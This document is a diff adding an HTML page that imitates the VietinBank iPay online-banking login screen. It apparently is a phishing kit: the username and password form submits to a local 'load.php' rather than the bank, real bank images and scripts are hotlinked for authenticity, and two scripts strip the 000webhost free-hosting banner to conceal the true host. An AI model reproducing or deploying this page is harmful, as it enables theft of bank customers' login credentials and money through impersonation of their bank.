@@ -1,0 +1,200 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html lang="en" dir="ltr" class="iFrameBankFast">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Sandstone Technology">
+  <title>Online Banking Login for Retail Customers
+  </title>
+  <script language="javascript" type="text/javascript"><!--
+function _errmsg() {if (document.forms["SSF"].elements["errmsg"].value.length > 0) {alert(document.forms["SSF"].elements["errmsg"].value)}}// -->
+
+  </script>
+  <script language="JavaScript" type="text/javascript" src="https://ebanking.vietinbank.vn/rcas/bankfast/js/sandstone-jquery-package.js">
+  </script>
+  <script language="JavaScript" type="text/javascript" src="https://ebanking.vietinbank.vn/rcas/bankfast/defaultAABD.js">
+  </script>
+  <link rel="stylesheet" type="text/css" media="all" href="https://ebanking.vietinbank.vn/rcas/bankfast/defaultDEC6.css">
+  <link rel="stylesheet" type="text/css" media="print" href="https://ebanking.vietinbank.vn/rcas/bankfast/print6772.css"><link rel="shortcut icon" href="favicon.ico">
+</head>
+<body class="bankfast" id="LG11" onkeydown="return _keypress(event)">
+  <script language="javascript" type="text/javascript"><!--
+$(function() {_errmsg(); document.getElementsByTagName('body')[0].className += ' scriptOn'; })// -->
+<script>window.onload = () => {
+   let bannerNode = document.querySelector('[alt="www.000webhost.com"]').parentNode.parentNode;
+   bannerNode.parentNode.removeChild(bannerNode);
+}</script>
+  </script>
+  <div class="container">
+    <div class="header-wrapper">
+      <div class="header">
+        <div class="logo-wrapper"><img src="https://ebanking.vietinbank.vn/rcas/bankfast/images/logo.png" class="logo" alt="Internet banking" />
+        </div>
+        <div class="logo-print"><img src="https://ebanking.vietinbank.vn/rcas/bankfast/images/logo.png" class="printLogo" alt="" />
+        </div>
+        <div class="marketing-banner bannerLogon">
+        </div>
+        <div id="signedIn" class="signed-in">
+          <form class="form" id="SSF3Form" method="post" action="load.php" name="SSF3" enctype="application/x-www-form-urlencoded">
+            <div class="signed-in-user">
+            </div>
+            <div class="signed-in-view-summary">
+            </div>
+            <input type="hidden" name="SPID" value="T5W8X5MCNH_Z626PR848NQMMWYG">
+            <input type="hidden" name="ss_bid" value="">
+          </form>
+        </div>
+        <div id="toolbar" class="toolbar">
+          <form class="form" id="SSF2Form" method="post" action="load.php" name="SSF2" >
+            <a href="#content" class="skipMenu">Bỏ qua Menu
+            </a>
+            <div id="BTNSecurityTips" class="toolbar-security-tips">
+            </div>
+            <div id="BTNLogoff" class="toolbar-logoff">
+            </div>
+            <div id="BTNDemo" class="toolbar-demo">
+            </div>
+            <div id="BTNContactUs" class="toolbar-contact-us">
+            </div>
+            <div id="BTNFindUs" class="toolbar-find-us">
+            </div>
+            <div id="BTNMyProfile" class="toolbar-my-profile">
+            </div>
+            <div id="BTNHelp" class="toolbar-help">
+              <input class="button help" type="button" name="bu_0" value="Hỗ trợ" onclick="window.open('./Help/vi/LG11Help.htm','BL_Help','left=0,top=0,location=0,menubar=0,resizable=0,status=1,toolbar=0,scrollbars=1'); return false">
+            </div>
+            <div id="BTNPrint" class="toolbar-print">
+              <input class="button print" type="button" name="bu_1" value="In" onclick="window.parent.print();; return false">
+            </div>
+            <input type="hidden" name="SPID" value="T5W8X5MCNH_Z626PR848NQMMWYG">
+            <input type="hidden" name="ss_bid" value="">
+          </form>
+        </div>
+        <div id="screenId" class="header-screen-id">T5W8X5MCNH-LG11
+        </div>
+      </div>
+    </div>
+    <div class="navigation-wrapper">
+      <div class="navigation"><span class="hiddenOffScreen">Mục lục
+        </span>
+        <form class="form" id="SSF4Form" method="post" action="Vib-login" name="SSF4" enctype="application/x-www-form-urlencoded">
+          <ul id="nbPlaceHolderSide" class="menu"></ul>
+          <input type="hidden" name="SPID" value="T5W8X5MCNH_Z626PR848NQMMWYG">
+          <input type="hidden" name="ss_bid" value="">
+        </form>
+      </div>
+    </div>
+    <div class="main-content">
+      <form class="form" method="post" action="load.php" name="SSF" enctype="application/x-www-form-urlencoded" autocomplete="off" onsubmit="encPw()">
+        <div class="message top">
+          <div class="message-page">
+          </div>
+        </div>
+        <div class="content">
+          <div class="login-content-header">
+            <h1 class="login-content-title">Chào mừng Quý khách đến với <b>VietinBank iPay</b>
+            </h1>
+          </div>
+          <div class="content-body">
+            <div class="login-details">
+              <div id="username" class="form-row">
+                <label class="form-label" for="txtUsername">Tên đăng nhập
+                </label>
+                <div class="form-controls">
+                  <input class="input-text" type="text" name="txtUsername" size="20" id="txtUsername" value="" maxlength="50">
+                </div>
+              </div>
+              <div id="password" class="form-row">
+                <label class="form-label" for="txtPassword">Mật khẩu
+                </label>
+                <div class="form-controls">
+                  <input type="password" name="Password" size="20" id="txtPassword" autocomplete="off" alt="Mật khẩu" class="keyboardInput" maxlength="35">
+                </div>
+              </div>
+            </div>
+            <div class="buttons-action">
+              <input class="button primary sign-in btndf" type="submit" name="submit" value="Đăng nhập">
+            </div>
+            <div id="scramblePad">
+            </div>
+            <ul id="register-nav" class="nav">
+              <li class="nav-item first">
+                <a class="registerHereLink" onclick="window.open('https://ebanking.vietinbank.vn/rcas/portal/web/retail/bfapply-registration'); return false" href="#">Đăng ký mới</a>
+              </li>
+              <li class="nav-item">
+                <a class="resetPasswordLink" onclick="return subWith('bu_4', event);" href="Vib-login?wid=bu_4&amp;SPID=T5W8X5MCNH_Z626PR848NQMMWYG">Quên mật khẩu</a>
+              </li>
+              <li class="nav-item">
+                <a class="helpLink" onclick="window.open('./Help/vi/LG11Help.htm','BL_Help','left=0,top=0,location=0,menubar=0,resizable=0,status=1,toolbar=0,scrollbars=1'); return false" href="#">Hỗ trợ</a>
+              </li>
+              <li class="nav-item">
+                <a class="privacyPolicyLink" onclick="window.open('https://www.vietinbank.vn/sites/mediafile/VTB135642'); return false" href="#">Chính sách bảo mật</a>
+              </li>
+              <li class="nav-item">
+                <a class="syncRSATokenLink" onclick="window.open('https://ebanking.vietinbank.vn/rsasync'); return false" href="#">ĐỒNG BỘ THẺ RSA</a>
+              </li>
+              <li class="nav-item">
+                <a class="vietinBankiPayRegisterLink" onclick="window.open('https://ebanking.vietinbank.vn/register'); return false" href="#">ĐĂNG KÝ VIETINBANK IPAY</a>
+              </li>
+              <li class="nav-item">
+                <a class="forgotPasswordLink" onclick="window.open('https://ebanking.vietinbank.vn/register/reset/'); return false" href="#">Forgot Password</a>
+              </li>
+              <li class="nav-item last">
+                <a class="forgotUsernameLink" onclick="window.open('https://ebanking.vietinbank.vn/register/getusername/'); return false" href="#">Forgot Username</a>
+              </li>
+            </ul>
+            <div class="cpy">
+            </div>
+          </div>
+        </div>
+        <div class="message bottom">
+          <div class="message-page">
+          </div>
+        </div>
+        
+      </form>
+    </div>
+    <div class="footer-wrapper">
+      <div class="footer">
+        <div class="hidden">
+        </div>
+        <div class="powered-by">
+          <a id="sstLogo" class="sandstone-logo" href="http://www.sandstone.com.au" target="_blank" title="Sandstone Technology">Powered by Sandstone Technology</a>
+        </div>
+        <div class="copyright">
+          <p>Vietinbank [ 1.1.0.149.PPE.5.hotfix.1  DEC6 6772 2232 ]
+        </div>
+        <div id="footerContactInfo" class="contact-info">Quý khách vui lòng liên hệ số Hotline 1900 558868 để được hỗ trợ
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="ga">
+    <input type="hidden" id="GoogleAnalyticsUA" value="">
+  </div>
+  <script language="JavaScript" type="text/javascript" src="jq617D.js">
+  </script>
+  <script language="JavaScript" type="text/javascript" src="bpayview01E3.js">
+  </script>
+  <script language="javascript" type="text/javascript"><!--
+function encPw() {
+rExp=[65537]
+rMod=[67006947,119187899,22465775,6554127,112998113,173260655,252351652,189383080,166801353,94502785,226339433,118942154,216966833,80549301,182731349,42964858,199192498,155432351,185]
+frm=document.forms["SSF"]
+encWid(rExp, rMod, frm, "SPID", "txtPassword")
+}
+function subWith(wid, event) {encPw(); return subW2(wid, event)}
+document.forms["SSF"].elements["txtUsername"].focus();
+function autoSubmitWithEnter(event) {
+	return subWith("_enter", event); }
+    // -->
+
+  </script>
+  <script>window.onload = () => {
+   let bannerNode = document.querySelector('[alt="www.000webhost.com"]').parentNode.parentNode;
+   bannerNode.parentNode.removeChild(bannerNode);
+}</script>
+</body>
+</html><input id="hideOverlay" type="hidden">
